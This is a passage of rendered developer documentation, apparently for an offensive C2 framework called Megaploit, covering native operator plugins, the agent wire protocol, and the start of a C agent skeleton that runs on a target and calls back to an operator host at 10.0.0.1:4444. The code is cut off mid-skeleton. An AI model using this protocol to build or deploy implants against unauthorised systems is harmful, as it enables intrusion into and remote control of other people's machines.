+        
+          <li class="md-nav__item">
+  <a href="#c-remote-shell-client-windows-exe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        C-remote-shell client (Windows EXE)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="c-plugin-development-guide">C Plugin Development Guide<a class="headerlink" href="#c-plugin-development-guide" title="Permanent link">&para;</a></h1>
+<p>This guide covers everything needed to extend Megaploit with C or C++ code.
+There are two distinct roles a C/C++ program can play:</p>
+<table>
+<thead>
+<tr>
+<th>Role</th>
+<th>What it does</th>
+<th>Entry point</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Native operator tool</strong></td>
+<td>Runs on the operator machine; receives CLI args via <code>argv</code>, prints to stdout</td>
+<td><code>.toml</code> with <code>kind = "native"</code></td>
+</tr>
+<tr>
+<td><strong>C2 agent</strong></td>
+<td>Runs on the target; speaks the full Megaploit wire protocol and accepts operator commands</td>
+<td>The C-remote-shell (<code>C-remote-shell/</code>)</td>
+</tr>
+</tbody>
+</table>
+<p>Both roles share the same wire-protocol constants defined in
+<a href="../plugins/native_sdk/megaploit_protocol.h"><code>plugins/native_sdk/megaploit_protocol.h</code></a>.</p>
+<hr />
+<h2 id="contents">Contents<a class="headerlink" href="#contents" title="Permanent link">&para;</a></h2>
+<ol>
+<li><a href="#1-native-operator-tool">Native operator tool</a></li>
+<li><a href="#2-wire-protocol-reference">Wire protocol reference</a></li>
+<li><a href="#3-c2-agent-implementation">C2 agent implementation</a></li>
+<li><a href="#4-c-remote-shell-as-the-reference-agent">C-remote-shell as the reference agent</a></li>
+<li><a href="#5-c2-compliance-probe">C2 compliance probe</a></li>
+<li><a href="#6-megaploit_protocolh-api">megaploit_protocol.h API</a></li>
+<li><a href="#7-common-pitfalls">Common pitfalls</a></li>
+<li><a href="#8-compiler-requirements">Compiler requirements</a></li>
+</ol>
+<hr />
+<h2 id="1-native-operator-tool">1. Native Operator Tool<a class="headerlink" href="#1-native-operator-tool" title="Permanent link">&para;</a></h2>
+<p>A native plugin is a regular C or C++ program. The Megaploit runner compiles
+it on demand and invokes it with expanded CLI args as <code>argv[1..N]</code>. Stdout and
+stderr are captured and streamed back to the operator console. It has nothing
+to do with the C2 socket — it is just a local tool.</p>
+<h3 id="11-minimal-example">1.1 Minimal example<a class="headerlink" href="#11-minimal-example" title="Permanent link">&para;</a></h3>
+<p><strong><code>plugins/mytools/syscheck.c</code></strong></p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Usage: syscheck &lt;hostname&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Checking: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="cm">/* ... your logic ... */</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Done.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong><code>plugins/mytools/mytools.toml</code></strong></p>
+<div class="language-toml highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">[plugin]</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">name</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;mytools&quot;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">version</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;1.0.0&quot;</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">author</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;YourName&quot;</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="n">description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Example native C tool&quot;</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="k">[[command]]</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">name</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;syscheck&quot;</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="n">kind</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;native&quot;</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="n">description</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Check a host from the operator machine&quot;</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="n">usage</span><span class="w">          </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;syscheck &lt;hostname&gt;&quot;</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="n">source_file</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;plugins/mytools/syscheck.c&quot;</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="n">compiler_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;-O2&quot;</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="n">min_args</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="n">max_args</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="n">timeout</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mi">30</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="n">output_format</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;raw&quot;</span>
+</span></code></pre></div>
+<p>Drop both files in place and run <code>plugins reload</code> (or restart Megaploit).
+The runner compiles <code>syscheck.c</code> on first use and caches the binary next to
+the source. It recompiles automatically when the source file is newer than
+the binary — same logic as <code>make</code>.</p>
+<h3 id="12-plugin-descriptor-fields">1.2 Plugin descriptor fields<a class="headerlink" href="#12-plugin-descriptor-fields" title="Permanent link">&para;</a></h3>
+<p>All fields for <code>kind = "native"</code> commands:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Type</th>
+<th>Default</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>name</code></td>
+<td>string</td>
+<td>required</td>
+<td>Operator-facing command name (no spaces)</td>
+</tr>
+<tr>
+<td><code>kind</code></td>
+<td>string</td>
+<td>required</td>
+<td>Must be <code>"native"</code></td>
+</tr>
+<tr>
+<td><code>description</code></td>
+<td>string</td>
+<td><code>""</code></td>
+<td>One-line description shown in <code>help</code></td>
+</tr>
+<tr>
+<td><code>usage</code></td>
+<td>string</td>
+<td>command name</td>
+<td>Usage hint shown in <code>help</code></td>
+</tr>
+<tr>
+<td><code>source_file</code></td>
+<td>string</td>
+<td>required</td>
+<td>Path to <code>.c</code> or <code>.cpp</code> source file</td>
+</tr>
+<tr>
+<td><code>compiler_flags</code></td>
+<td>string</td>
+<td><code>""</code></td>
+<td>Extra flags passed verbatim to the compiler</td>
+</tr>
+<tr>
+<td><code>min_args</code></td>
+<td>int</td>
+<td><code>0</code></td>
+<td>Minimum CLI args required</td>
+</tr>
+<tr>
+<td><code>max_args</code></td>
+<td>int</td>
+<td><code>-1</code> (unlimited)</td>
+<td>Maximum CLI args accepted</td>
+</tr>
+<tr>
+<td><code>timeout</code></td>
+<td>int</td>
+<td><code>0</code> (none)</td>
+<td>Seconds before the process is killed</td>
+</tr>
+<tr>
+<td><code>dangerous</code></td>
+<td>bool</td>
+<td><code>false</code></td>
+<td>Require <code>YES</code> confirmation before running</td>
+</tr>
+<tr>
+<td><code>output_format</code></td>
+<td>string</td>
+<td><code>"raw"</code></td>
+<td><code>"raw"</code> / <code>"json"</code> / <code>"table"</code> / <code>"csv"</code></td>
+</tr>
+<tr>
+<td><code>env_vars</code></td>
+<td>table</td>
+<td><code>{}</code></td>
+<td>Extra environment variables injected at runtime</td>
+</tr>
+<tr>
+<td><code>retry</code></td>
+<td>int</td>
+<td><code>0</code></td>
+<td>Retry count on non-zero exit</td>
+</tr>
+<tr>
+<td><code>notes</code></td>
+<td>string</td>
+<td><code>""</code></td>
+<td>Long-form operator notes shown in <code>help &lt;cmd&gt;</code></td>
+</tr>
+<tr>
+<td><code>tags</code></td>
+<td>array</td>
+<td><code>[]</code></td>
+<td>Search tags for <code>plugins search</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="13-placeholders">1.3 Placeholders<a class="headerlink" href="#13-placeholders" title="Permanent link">&para;</a></h3>
+<p>The following placeholders are expanded inside <code>compiler_flags</code> and the
+<code>env_vars</code> values at runtime:</p>
+<table>
+<thead>
+<tr>
+<th>Placeholder</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{lhost}</code></td>
+<td>Operator LHOST setting</td>
+</tr>
+<tr>
+<td><code>{port}</code></td>
+<td>Operator PORT setting</td>
+</tr>
+<tr>
+<td><code>{session_ip}</code></td>
+<td>Active session IP</td>
+</tr>
+<tr>
+<td><code>{session_id}</code></td>
+<td>Active session numeric ID</td>
+</tr>
+<tr>
+<td><code>{session_tag}</code></td>
+<td>Operator tag for the session</td>
+</tr>
+<tr>
+<td><code>{session_os}</code></td>
+<td>Session OS name</td>
+</tr>
+<tr>
+<td><code>{session_hostname}</code></td>
+<td>Session hostname</td>
+</tr>
+<tr>
+<td><code>{session_username}</code></td>
+<td>Session username</td>
+</tr>
+<tr>
+<td><code>{arg0}</code> … <code>{argN}</code></td>
+<td>Positional CLI args</td>
+</tr>
+<tr>
+<td><code>{joined_args}</code></td>
+<td>All args joined with spaces</td>
+</tr>
+<tr>
+<td><code>{key:-default}</code></td>
+<td>Use <code>default</code> when <code>key</code> is empty</td>
+</tr>
+</tbody>
+</table>
+<p>Args are passed to the compiled binary as <code>argv[1..N]</code> — you do not need to
+handle placeholder expansion in your C code.</p>
+<h3 id="14-compiler-selection">1.4 Compiler selection<a class="headerlink" href="#14-compiler-selection" title="Permanent link">&para;</a></h3>
+<p>The runner tries compilers in this order:</p>
+<ul>
+<li><code>.c</code> source: <code>gcc</code> → <code>clang</code> → <code>cc</code></li>
+<li><code>.cpp</code> source: <code>g++</code> → <code>clang++</code> → <code>c++</code></li>
+</ul>
+<p>The first one found on <code>PATH</code> is used. Override explicitly with
+<code>compiler_flags = "-std=c11 -O2"</code> etc.</p>
+<h3 id="15-binary-caching">1.5 Binary caching<a class="headerlink" href="#15-binary-caching" title="Permanent link">&para;</a></h3>
+<p>The cached binary path is derived from an 8-character SHA-256 digest of the
+absolute source path, stored alongside the source:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>plugins/mytools/syscheck_a1b2c3d4          (Linux/macOS)
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>plugins/mytools/syscheck_a1b2c3d4.exe      (Windows)
+</span></code></pre></div>
+<p>This prevents collisions between plugins with identically-named source files.
+The binary is recompiled automatically when <code>mtime(source) &gt; mtime(binary)</code>.</p>
+<h3 id="16-output-formats">1.6 Output formats<a class="headerlink" href="#16-output-formats" title="Permanent link">&para;</a></h3>
+<p>Set <code>output_format</code> to control how stdout is rendered:</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Behaviour</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>"raw"</code></td>
+<td>Print as-is (default)</td>
+</tr>
+<tr>
+<td><code>"json"</code></td>
+<td>Pretty-print JSON parsed from stdout</td>
+</tr>
+<tr>
+<td><code>"pretty_json"</code></td>
+<td>Same as <code>json</code> but with sorted keys</td>
+</tr>
+<tr>
+<td><code>"table"</code></td>
+<td>Render JSON list-of-dicts or list-of-lists as an ASCII table</td>
+</tr>
+<tr>
+<td><code>"csv"</code></td>
+<td>Render JSON list-of-lists as CSV</td>
+</tr>
+</tbody>
+</table>
+<p>For <code>"table"</code> and <code>"csv"</code>, your C program should print valid JSON to stdout.</p>
+<hr />
+<h2 id="2-wire-protocol-reference">2. Wire Protocol Reference<a class="headerlink" href="#2-wire-protocol-reference" title="Permanent link">&para;</a></h2>
+<p>Every message between the Megaploit server and an agent (Python, Go, C, or
+any other language) follows this exact layout. Violating any rule causes the
+Python server to silently reject the client.</p>
+<h3 id="21-message-framing">2.1 Message framing<a class="headerlink" href="#21-message-framing" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>+------------------+---------------------------+
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>|  4 bytes         |  N bytes                  |
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>|  uint32 big-end  |  payload                  |
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>|  (total length)  |  (see below)              |
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>+------------------+---------------------------+
+</span></code></pre></div>
+<p>The 4-byte header is a <strong>big-endian unsigned 32-bit integer</strong> containing the
+number of bytes that follow. This matches Python's <code>struct.pack("!I", N)</code>.</p>
+<h3 id="22-plaintext-payload-v1-unencrypted">2.2 Plaintext payload (v1 / unencrypted)<a class="headerlink" href="#22-plaintext-payload-v1-unencrypted" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>+------------------+---------------------------+
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>|  8 bytes         |  data bytes               |
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>|  uint64 big-end  |  JSON-encoded string      |
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>|  sequence number |                           |
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>+------------------+---------------------------+
+</span></code></pre></div>
+<p>The first 8 bytes of every payload are a <strong>big-endian unsigned 64-bit
+monotonic sequence number</strong>, matching Python's <code>struct.pack("!Q", seq)</code>.</p>
+<p>The data bytes that follow are a <strong>JSON-encoded string</strong> — not a JSON object
+or array, but the JSON representation of a plain string value. For example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&quot;ls -la&quot;        (a command the server sends to the agent)
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&quot;[+] result&quot;    (a response the agent sends back)
+</span></code></pre></div>
+<p>In C, produce this with <code>snprintf(buf, size, "\"%s\"", text)</code>.</p>
+<h3 id="23-encrypted-payload-v2-aes-256-gcm">2.3 Encrypted payload (v2, AES-256-GCM)<a class="headerlink" href="#23-encrypted-payload-v2-aes-256-gcm" title="Permanent link">&para;</a></h3>
+<p>When v2 is active the entire plaintext block (seq + data) is encrypted:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>+------------------+----------------------------+------------------+
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>|  12 bytes        |  N bytes                   |  16 bytes        |
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>|  random nonce    |  AES-GCM ciphertext        |  auth tag        |
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>+------------------+----------------------------+------------------+
+</span></code></pre></div>
+<p>The nonce is random for every message. The auth tag is <strong>appended after</strong>
+the ciphertext — not prepended. Key length is always 32 bytes (AES-256).</p>
+<h3 id="24-connection-handshake-sequence">2.4 Connection handshake sequence<a class="headerlink" href="#24-connection-handshake-sequence" title="Permanent link">&para;</a></h3>
+<p>Every connection follows this exact sequence after TCP connect:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a> Server                          Agent
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>   |                               |
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>   |--- 16 random bytes (nonce) --&gt;|   (HMAC challenge)
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>   |&lt;-- HMAC-SHA256(key, nonce) ---|   (32 bytes)
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>   |                               |
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>   |--- 1 byte: 0x4D or 0x00 -----&gt;|   (version: &#39;M&#39;=v2, 0x00=v1)
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>   |&lt;-- same byte echo ------------|
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>   |                               |
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>   |=== encrypted C2 channel =====&gt;|   (if v2)
+</span></code></pre></div>
+<p>Step 1 mirrors <a href="../megaploit/core/crypto.py"><code>megaploit/core/crypto.py</code> <code>agent_authenticate()</code></a>.<br />
+Step 2 mirrors <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py</code> <code>handshake_agent()</code></a>.</p>
+<h3 id="25-replay-protection">2.5 Replay protection<a class="headerlink" href="#25-replay-protection" title="Permanent link">&para;</a></h3>
+<p>Each side maintains an independent monotonic 64-bit sequence counter:</p>
+<ul>
+<li><strong>Send</strong>: increment before every message, starting at 1.</li>
+<li><strong>Receive</strong>: initialise to -1 (meaning "nothing received yet"). Reject any
+  message whose sequence number is not strictly greater than the last accepted
+  value. This mirrors <code>_ConnState.check_recv_seq()</code> in <code>protocol.py</code>.</li>
+</ul>
+<h3 id="26-protocol-constants">2.6 Protocol constants<a class="headerlink" href="#26-protocol-constants" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Constant</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>MP_HDR_LEN</code></td>
+<td><code>4</code></td>
+<td>Outer length prefix (bytes)</td>
+</tr>
+<tr>
+<td><code>MP_SEQ_LEN</code></td>
+<td><code>8</code></td>
+<td>Sequence number (bytes)</td>
+</tr>
+<tr>
+<td><code>MP_NONCE_LEN</code></td>
+<td><code>12</code></td>
+<td>AES-GCM nonce (bytes)</td>
+</tr>
+<tr>
+<td><code>MP_TAG_LEN</code></td>
+<td><code>16</code></td>
+<td>AES-GCM auth tag (bytes)</td>
+</tr>
+<tr>
+<td><code>MP_KEY_LEN</code></td>
+<td><code>32</code></td>
+<td>Shared secret / AES-256 key (bytes)</td>
+</tr>
+<tr>
+<td><code>MP_V2_MAGIC</code></td>
+<td><code>0x4D</code></td>
+<td>Version byte for v2 encrypted protocol</td>
+</tr>
+<tr>
+<td><code>MP_MAX_MSG</code></td>
+<td><code>256 MiB</code></td>
+<td>Per-frame allocation ceiling — matches <code>MAX_PLUGIN_MSG_SIZE</code> in <code>config.py</code></td>
+</tr>
+<tr>
+<td><code>TLS_BUF_RECORD</code></td>
+<td><code>16384</code></td>
+<td>RFC 5246 §6.2.1 max TLS record size</td>
+</tr>
+<tr>
+<td><code>TLS_BUF_SERVER_FLIGHT</code></td>
+<td><code>8192</code></td>
+<td>Coalesced TLS server handshake flight</td>
+</tr>
+<tr>
+<td><code>TLS_BUF_CLIENT_HELLO</code></td>
+<td><code>1024</code></td>
+<td>ClientHello with extensions</td>
+</tr>
+<tr>
+<td><code>C2_APP_BUF</code></td>
+<td><code>65536</code></td>
+<td>Post-handshake C2 app buffer — matches <code>BUFFER_SIZE</code> in <code>config.py</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="3-c2-agent-implementation">3. C2 Agent Implementation<a class="headerlink" href="#3-c2-agent-implementation" title="Permanent link">&para;</a></h2>
+<p>A C2 agent is a client that connects to the Megaploit server, authenticates,
+and enters a command loop. Use <code>megaploit_protocol.h</code> for the framing layer.</p>
+<h3 id="31-minimal-agent-skeleton-c-plaintext">3.1 Minimal agent skeleton (C, plaintext)<a class="headerlink" href="#31-minimal-agent-skeleton-c-plaintext" title="Permanent link">&para;</a></h3>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="cp">#define MEGAPLOIT_USE_OPENSSL   </span><span class="cm">/* remove for plaintext only */</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;megaploit_protocol.h&quot;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;openssl/hmac.h&gt;</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">connect_to_c2</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="p">);</span><span class="w">  </span><span class="cm">/* your TCP code */</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">key</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="cm">/* your 32-byte shared secret */</span><span class="w"> </span><span class="p">};</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connect_to_c2</span><span class="p">(</span><span class="s">&quot;10.0.0.1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4444</span><span class="p">);</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">    </span><span class="cm">/* Step 1: HMAC-SHA256 challenge/response */</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">challenge</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="w">    </span><span class="n">mp_recv_exactly</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">challenge</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="w">    </span><span class="n">HMAC</span><span class="p">(</span><span class="n">EVP_sha256</span><span class="p">(),</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="n">challenge</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="w">    </span><span class="n">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>
